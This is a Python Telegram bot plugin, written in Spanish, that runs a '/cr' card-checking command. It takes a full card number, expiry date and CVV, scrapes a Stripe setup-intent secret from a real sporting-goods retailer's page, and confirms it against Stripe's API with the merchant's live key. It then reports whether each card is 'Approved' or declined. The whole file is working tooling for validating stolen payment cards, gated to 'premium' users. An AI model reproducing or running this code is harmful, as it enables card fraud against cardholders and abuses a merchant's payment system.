import json
import requests
import time
import asyncio
from colored import fg, bg, attr
from asyncio import sleep
from pyrogram import Client, filters
from pyrogram.types import (
    Message,
    InlineKeyboardButton,
    InlineKeyboardMarkup
) 

from gates.gateways import Gateways

from datos import idchat

@Client.on_message(filters.command(["cr"], ["/", "."]))
async def cr(_, message: Message):
    
    with open(file='plugins/usuarios/premium.txt',mode='r+',encoding='utf-8') as archivo:
        x = archivo.readlines()
        if str(message.from_user.id) + '\n' in x or message.chat.id in idchat:

            data = message.text.split(" ", 2)

            if len(data) < 2:
                await message.reply_text("<b>⎚ Usar <code>/cr card</code></b>")
                return

            ccs  = data[1]
            card = ccs.split("|")
            cc   = card[0]
            mes  = card[1]
            if not mes:
                await message.reply_text("<b>⎚ Usar <code>/cr card</code></b>")
                return
            ano  = card[2]
            cvv  = card[3]
            bin_code = cc[:6]
            low_ano = lambda x: x[2:] if len(x) == 4 else x
            ano = low_ano(ano)
                
            gate = Gateways('Alga', ccs)

            response = requests.get('https://www.racquetballwarehouse.com/ccinfo.php').text
            eti_secret = response.split('id="stripe_payment" data-client-secret="')[1].split('"')[0]
            seti = eti_secret.split("_secret_")[0]
                
            text = gate.initial_progress()
            mess = await message.reply_text(text)
                
            headers = {
                'authority': 'api.stripe.com',
                'accept': 'application/json',
                'accept-language': 'es-ES,es;q=0.9',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://js.stripe.com',
                'referer': 'https://js.stripe.com/',
                'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-site',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',}
                
            data = f'return_url=https%3A%2F%2Fwww.racquetballwarehouse.com%2Ffinalcheckout.php&payment_method_data[billing_details][address][city]=&payment_method_data[billing_details][address][line1]=&payment_method_data[billing_details][address][line2]=&payment_method_data[billing_details][address][postal_code]=&payment_method_data[billing_details][address][state]=&payment_method_data[billing_details][address][country]=US&payment_method_data[billing_details][email]=&payment_method_data[billing_details][name]=+&payment_method_data[billing_details][phone]=&payment_method_data[type]=card&payment_method_data[card][number]={cc}&payment_method_data[card][cvc]={cvv}&payment_method_data[card][exp_year]={ano}&payment_method_data[card][exp_month]={mes}&payment_method_data[pasted_fields]=number&payment_method_data[payment_user_agent]=stripe.js%2F037e7c502%3B+stripe-js-v3%2F037e7c502%3B+payment-element&payment_method_data[time_on_page]=68798&payment_method_data[guid]=14c4d026-6952-41fe-a710-01a7a366d17e4575d6&payment_method_data[muid]=cac16bf6-2f19-4843-95c1-22e8e70f79083ad1ec&payment_method_data[sid]=15b4c3e0-bdef-4c19-bf11-0b8f52a6be45cead61&expected_payment_method_type=card&use_stripe_sdk=true&key=pk_live_51KsEdjKnTNpmSjw1sHz5UGOh7KBQw7ub0Hd7SyMII72PfQsnJ2tFxLYYoXy1usGt4LvNbecTljlk90wlMUQ4Hfpa00uhiyleEV&client_secret={eti_secret}'
                
            response = requests.post(f'https://api.stripe.com/v1/setup_intents/{seti}/confirm',headers=headers,data=data,)
                
            text = gate.initial_progress(100)
            mess = await mess.edit_text(text)

                
            if 'three_d_secure_2_source' in response.text:
                text = gate.finish_progress('Approved 3D ✅')
                await mess.edit_text(text)
            elif 'generic_decline' in response.text:
                error = response.json()["error"]
                text = gate.finish_progress('Decline ❌', error['message'])
                await mess.edit_text(text)
            elif 'succeeded' in response.text:
                error = 'Succeeded ✅'
                text = gate.finish_progress('Approved ✅', error)
                await mess.edit_text(text)
            elif 'insufficient_funds' in response.text:
                error = response.json()["error"]
                text = gate.finish_progress('Approved ✅', error['message'])
                await mess.edit_text(text)
            elif 'incorrect_cvc' in response.text:
                error = response.json()["error"]
                text = gate.finish_progress(error["message"] + "✅", error['code'])
                await mess.edit_text(text)
            elif 'error' in response.text:
                error = response.json()["error"]
                text = gate.finish_progress(error["message"] + "❌", error['code'])
                await mess.edit_text(text)
            else:
                text = gate.finish_progress('Unknown ❌')
                await mess.edit_text(text)

        else:
            return await message.reply(f'<b>⎚ Chat no autorizado | O no eres Premium.</b>')
   